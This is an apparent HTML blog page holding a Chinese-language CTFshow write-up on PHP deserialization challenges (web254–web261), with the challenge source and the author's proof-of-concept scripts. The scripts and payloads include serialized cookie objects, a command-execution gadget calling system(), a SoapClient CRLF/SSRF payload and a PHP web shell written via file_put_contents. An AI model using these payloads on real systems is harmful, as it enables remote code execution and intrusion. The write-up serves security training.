@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CTFSHOW-WEB入门-反序列化 | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="web254 &lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include(&#039;flag.php&#039;); class ctfShowUser{ public $username=&#039;xxxxxx&#039;; public $password=&#039;xxxxxx&#039;; public $isVip=false; public function checkVip(){ return $this-&gt;isVip; } public function login($u,$p){ if($this-&gt;username===$u&&$this-&gt;password===$p){ $this-&gt;isVip=true; } return $this-&gt;isVip; } public function vipOneKeyGetFlag(){ if($this-&gt;isVip){ global $flag; echo &#34;your flag is &#34;.$flag;">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/237/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/237/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="CTFSHOW-WEB入门-反序列化" />
+<meta property="og:description" content="web254 &lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include(&#039;flag.php&#039;); class ctfShowUser{ public $username=&#039;xxxxxx&#039;; public $password=&#039;xxxxxx&#039;; public $isVip=false; public function checkVip(){ return $this-&gt;isVip; } public function login($u,$p){ if($this-&gt;username===$u&&$this-&gt;password===$p){ $this-&gt;isVip=true; } return $this-&gt;isVip; } public function vipOneKeyGetFlag(){ if($this-&gt;isVip){ global $flag; echo &#34;your flag is &#34;.$flag;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/237/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-14T08:46:32+00:00" />
+<meta property="article:modified_time" content="2022-04-14T08:46:32+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTFSHOW-WEB入门-反序列化"/>
+<meta name="twitter:description" content="web254 &lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include(&#039;flag.php&#039;); class ctfShowUser{ public $username=&#039;xxxxxx&#039;; public $password=&#039;xxxxxx&#039;; public $isVip=false; public function checkVip(){ return $this-&gt;isVip; } public function login($u,$p){ if($this-&gt;username===$u&&$this-&gt;password===$p){ $this-&gt;isVip=true; } return $this-&gt;isVip; } public function vipOneKeyGetFlag(){ if($this-&gt;isVip){ global $flag; echo &#34;your flag is &#34;.$flag;"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTFSHOW-WEB入门-反序列化",
+      "item": "https://a10nggg.github.io/archives/237/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFSHOW-WEB入门-反序列化",
+  "name": "CTFSHOW-WEB入门-反序列化",
+  "description": "web254 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include(\u0026#039;flag.php\u0026#039;); class ctfShowUser{ public $username=\u0026#039;xxxxxx\u0026#039;; public $password=\u0026#039;xxxxxx\u0026#039;; public $isVip=false; public function checkVip(){ return $this-\u0026gt;isVip; } public function login($u,$p){ if($this-\u0026gt;username===$u\u0026\u0026$this-\u0026gt;password===$p){ $this-\u0026gt;isVip=true; } return $this-\u0026gt;isVip; } public function vipOneKeyGetFlag(){ if($this-\u0026gt;isVip){ global $flag; echo \"your flag is \".$flag;",
+  "keywords": [
+    
+  ],
+  "articleBody": "web254 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ if($this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p){ $this-\u003eisVip=true; } return $this-\u003eisVip; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = new ctfShowUser(); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } 在这里没有反序列化，当传进去的值与类里的变量一致isVip=true。然后就得到flag。\n传入：?username=xxxxxx\u0026password=xxxxxx\nweb255 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } 要传进来的username和password与cookie反序列化的相同就行。\npoc:\n\u003c?php class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=true; } echo urlencode(serialize(new ctfShowUser())); cookie中将\"作为截断符号，这里用url编码一下绕过\nGet： ?username=xxxxxx\u0026password=xxxxxx\nCookie：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nweb256 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 19:29:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-\u003eisVip; } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function vipOneKeyGetFlag(){ if($this-\u003eisVip){ global $flag; if($this-\u003eusername!==$this-\u003epassword){ echo \"your flag is \".$flag; } }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } 这题跟上题一样。只是username要与password要不相等。\n改一下poc\n\u003c?php class ctfShowUser{ public $username='xxxxxx'; public $password='1'; public $isVip=true; } echo urlencode(serialize(new ctfShowUser())); Get： ?username=xxxxxx\u0026password=1\nCookie：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%221%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nweb257 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 20:33:07 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); class ctfShowUser{ private $username='xxxxxx'; private $password='xxxxxx'; private $isVip=false; private $class = 'info'; public function __construct(){ $this-\u003eclass=new info(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ private $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ private $code; public function getInfo(){ eval($this-\u003ecode); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); $user-\u003elogin($username,$password); } 这里涉及到两个魔术方法。\n__construct()//创建对象时触发\n__destruct() //对象被销毁时触发\npoc:\n\u003c?php class ctfShowUser{ private $username='xxxxxx'; private $password='xxxxxx'; private $isVip=false; private $class = 'info'; public function __construct(){ $this-\u003eclass=new backDoor(); } } class backDoor{ private $code = 'system($_GET[1]);'; } echo urlencode(serialize(new ctfShowUser())); Get: /?username=xxxxxx\u0026password=xxxxxx\u00261=cat%20flag*\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%24_GET%5B1%5D%29%3B%22%3B%7D%7D\nweb258 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 21:38:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public $class = 'info'; public function __construct(){ $this-\u003eclass=new info(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ public $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ public $code; public function getInfo(){ eval($this-\u003ecode); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){ $user = unserialize($_COOKIE['user']); } $user-\u003elogin($username,$password); } 这题跟上题一样，只是private改为了public。加个加号绕一下正则就行，需要url编码一下。\nweb259 __call的触发条件的是：\n当调用对象中不存在的方法会自动调用此方法 。\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); array_pop($xff); $ip = array_pop($xff); if($ip!=='127.0.0.1'){ die('error'); }else{ $token = $_POST['token']; if($token=='ctfshow'){ file_put_contents('flag.txt',$flag); } } 题目给出flag.php的部分代码。大概逻辑就是让xff为127.0.0.1时，传入token=ctfshow得到flag，这里伪造xff失败了。\n进入题目\n\u003c?php highlight_file(__FILE__); $vip = unserialize($_GET['vip']); //vip can get flag one key $vip-\u003egetFlag(); 这里只有一个反序列化，没有其他代码。\n因此这题需要利用原生类的反序列化来实现SSRF，SoapClient原生类的反序列化\n​ SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一\n种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果\n去调用了一个不存在的函数，会去调用 __call 方法 。\nxff要array_pop两次,取第二次的值赋值给$IP\nCRLF注入攻击\nCRLF是“回车+换行”（\\r\\n）的简称，其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP\nheader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。\n根据请求包构造一下就行。\n\u003c?php $a = new SoapClient(null,array('user_agent' =\u003e \"aaa\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1\\r\\nContent-type:application/x-www-form-urlencoded\\r\\nContent-length:13\\r\\n\\r\\ntoken=ctfshow\",'uri' =\u003e 'aaa','location' =\u003e 'http://127.0.0.1/flag.php')); echo urlencode(serialize($a)); web260 \u003c?php error_reporting(0); highlight_file(__FILE__); include('flag.php'); if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){ echo $flag; } 无话可说直接poc吧：\n\u003c?php echo urlencode(serialize('ctfshow_i_love_36D')); web261 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。\n\u003c?php highlight_file(__FILE__); class ctfshowvip{ public $username; public $password; public $code; public function __construct($u,$p){ $this-\u003eusername=$u; $this-\u003epassword=$p; } public function __wakeup(){ if($this-\u003eusername!='' || $this-\u003epassword!=''){ die('error'); } } public function __invoke(){ eval($this-\u003ecode); } public function __sleep(){ $this-\u003eusername=''; $this-\u003epassword=''; } public function __unserialize($data){ $this-\u003eusername=$data['username']; $this-\u003epassword=$data['password']; $this-\u003ecode = $this-\u003eusername.$this-\u003epassword; } public function __destruct(){ if($this-\u003ecode==0x36d){ file_put_contents($this-\u003eusername, $this-\u003epassword); } } } unserialize($_GET['vip']); __destruct()这里的$this-\u003ecode==0x36d，0x36d是数字型，而且是弱等于，可以绕过。\n0x36d=877\npoc:\n\u003c?php class ctfshowvip{ public $username; public $password; public function __construct(){ $this-\u003eusername=$u='877.php'; $this-\u003epassword=$p='\u003c?php @eval($_POST[1]);?\u003e'; } } echo urlencode(serialize(new ctfShowvip())); ",
+  "wordCount" : "1990",
+  "inLanguage": "en",
+  "datePublished": "2022-04-14T08:46:32Z",
+  "dateModified": "2022-04-14T08:46:32Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/237/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CTFSHOW-WEB入门-反序列化
+    </h1>
+    <div class="post-meta"><span title='2022-04-14 08:46:32 +0000 +0000'>April 14, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="web254">web254<a hidden class="anchor" aria-hidden="true" href="#web254">#</a></h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include(&#039;flag.php&#039;);
+
+class ctfShowUser{
+    public $username=&#039;xxxxxx&#039;;
+    public $password=&#039;xxxxxx&#039;;
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this-&gt;isVip;
+    }
+    public function login($u,$p){
+        if($this-&gt;username===$u&&$this-&gt;password===$p){
+            $this-&gt;isVip=true;
+        }
+        return $this-&gt;isVip;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this-&gt;isVip){
+            global $flag;
+            echo "your flag is ".$flag;
+        }else{
+            echo "no vip, no flag";
+        }
+    }
+}
+
+$username=$_GET[&#039;username&#039;];
+$password=$_GET[&#039;password&#039;];
+
+if(isset($username) && isset($password)){
+    $user = new ctfShowUser();
+    if($user-&gt;login($username,$password)){
+        if($user-&gt;checkVip()){
+            $user-&gt;vipOneKeyGetFlag();
+        }
+    }else{
+        echo "no vip,no flag";
+    }
+}
+</code></pre>
+<p>在这里没有反序列化，当传进去的值与类里的变量一致isVip=true。然后就得到flag。</p>
+<p>传入：?username=xxxxxx&amp;password=xxxxxx</p>
+<h2 id="web255">web255<a hidden class="anchor" aria-hidden="true" href="#web255">#</a></h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include(&#039;flag.php&#039;);
+
+class ctfShowUser{
+    public $username=&#039;xxxxxx&#039;;
+    public $password=&#039;xxxxxx&#039;;
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this-&gt;isVip;
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&&$this-&gt;password===$p;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this-&gt;isVip){
+            global $flag;
+            echo "your flag is ".$flag;
+        }else{
+            echo "no vip, no flag";
+        }
+    }
+}
+
+$username=$_GET[&#039;username&#039;];
+$password=$_GET[&#039;password&#039;];
+
+if(isset($username) && isset($password)){
+    $user = unserialize($_COOKIE[&#039;user&#039;]);    
+    if($user-&gt;login($username,$password)){
+        if($user-&gt;checkVip()){
+            $user-&gt;vipOneKeyGetFlag();
+        }
+    }else{
+        echo "no vip,no flag";
+    }
+}</code></pre>
+<p>要传进来的username和password与cookie反序列化的相同就行。</p>
+<p>poc:</p>
+<pre><code class="language-php">&lt;?php
+
+class ctfShowUser{
+    public $username=&#039;xxxxxx&#039;;
+    public $password=&#039;xxxxxx&#039;; 
+    public $isVip=true;
+}
+echo urlencode(serialize(new ctfShowUser()));
+</code></pre>
+<p>cookie中将&quot;作为截断符号，这里用url编码一下绕过</p>
+<p>Get： ?username=xxxxxx&amp;password=xxxxxx</p>
+<p>Cookie：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p>
+<h2 id="web256">web256<a hidden class="anchor" aria-hidden="true" href="#web256">#</a></h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include(&#039;flag.php&#039;);
+
+class ctfShowUser{
+    public $username=&#039;xxxxxx&#039;;
+    public $password=&#039;xxxxxx&#039;;
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this-&gt;isVip;
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&&$this-&gt;password===$p;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this-&gt;isVip){
+            global $flag;
+            if($this-&gt;username!==$this-&gt;password){
+                    echo "your flag is ".$flag;
+              }
+        }else{
+            echo "no vip, no flag";
+        }
+    }
+}
+
+$username=$_GET[&#039;username&#039;];
+$password=$_GET[&#039;password&#039;];
+
+if(isset($username) && isset($password)){
+    $user = unserialize($_COOKIE[&#039;user&#039;]);    
+    if($user-&gt;login($username,$password)){
+        if($user-&gt;checkVip()){
+            $user-&gt;vipOneKeyGetFlag();
+        }
+    }else{
+        echo "no vip,no flag";
+    }
+}</code></pre>
+<p>这题跟上题一样。只是username要与password要不相等。</p>
+<p>改一下poc</p>
+<pre><code class="language-php">&lt;?php
+
+class ctfShowUser{
+    public $username=&#039;xxxxxx&#039;;
+    public $password=&#039;1&#039;; 
+    public $isVip=true;
+}
+echo urlencode(serialize(new ctfShowUser()));</code></pre>
+<p>Get： ?username=xxxxxx&amp;password=1</p>
+<p>Cookie：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%221%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p>
+<h2 id="web257">web257<a hidden class="anchor" aria-hidden="true" href="#web257">#</a></h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 20:33:07
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser{
+    private $username=&#039;xxxxxx&#039;;
+    private $password=&#039;xxxxxx&#039;;
+    private $isVip=false;
+    private $class = &#039;info&#039;;
+
+    public function __construct(){
+        $this-&gt;class=new info();
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&&$this-&gt;password===$p;
+    }
+    public function __destruct(){
+        $this-&gt;class-&gt;getInfo();
+    }
+
+}
+
+class info{
+    private $user=&#039;xxxxxx&#039;;
+    public function getInfo(){
+        return $this-&gt;user;
+    }
+}
+class backDoor{
+    private $code;
+    public function getInfo(){
+        eval($this-&gt;code);
+    }
+}
+$username=$_GET[&#039;username&#039;];
+$password=$_GET[&#039;password&#039;];
+
+if(isset($username) && isset($password)){
+    $user = unserialize($_COOKIE[&#039;user&#039;]);
+    $user-&gt;login($username,$password);
+}</code></pre>
+<p>这里涉及到两个魔术方法。</p>
+<p>__construct()//创建对象时触发</p>
+<p>__destruct() //对象被销毁时触发</p>
+<p>poc:</p>
+<pre><code class="language-php">&lt;?php
+
+class ctfShowUser{
+    private $username=&#039;xxxxxx&#039;;
+    private $password=&#039;xxxxxx&#039;;
+    private $isVip=false;
+    private $class = &#039;info&#039;;
+
+    public function __construct(){
+        $this-&gt;class=new backDoor();
+    }
+}
+class backDoor{
+    private $code = &#039;system($_GET[1]);&#039;;
+}
+echo urlencode(serialize(new ctfShowUser()));</code></pre>
+<p>Get: /?username=xxxxxx&amp;password=xxxxxx&amp;1=cat%20flag*</p>
+<p>Cookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%24_GET%5B1%5D%29%3B%22%3B%7D%7D</p>
+<h2 id="web258">web258<a hidden class="anchor" aria-hidden="true" href="#web258">#</a></h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 21:38:56
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser{
+    public $username=&#039;xxxxxx&#039;;
+    public $password=&#039;xxxxxx&#039;;
+    public $isVip=false;
+    public $class = &#039;info&#039;;
+
+    public function __construct(){
+        $this-&gt;class=new info();
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&&$this-&gt;password===$p;
+    }
+    public function __destruct(){
+        $this-&gt;class-&gt;getInfo();
+    }
+
+}
+
+class info{
+    public $user=&#039;xxxxxx&#039;;
+    public function getInfo(){
+        return $this-&gt;user;
+    }
+}
+
+class backDoor{
+    public $code;
+    public function getInfo(){
+        eval($this-&gt;code);
+    }
+}
+
+$username=$_GET[&#039;username&#039;];
+$password=$_GET[&#039;password&#039;];
+
+if(isset($username) && isset($password)){
+    if(!preg_match(&#039;/[oc]:\d+:/i&#039;, $_COOKIE[&#039;user&#039;])){
+        $user = unserialize($_COOKIE[&#039;user&#039;]);
+    }
+    $user-&gt;login($username,$password);
+}</code></pre>
+<p>这题跟上题一样，只是private改为了public。加个加号绕一下正则就行，需要url编码一下。</p>
+<p><img loading="lazy" src="/uploads/2022/04/1649818923301.png" alt=""  />
+</p>
+<h2 id="web259">web259<a hidden class="anchor" aria-hidden="true" href="#web259">#</a></h2>
+<p>__call的触发条件的是：</p>
+<p>当调用对象中不存在的方法会自动调用此方法 。</p>
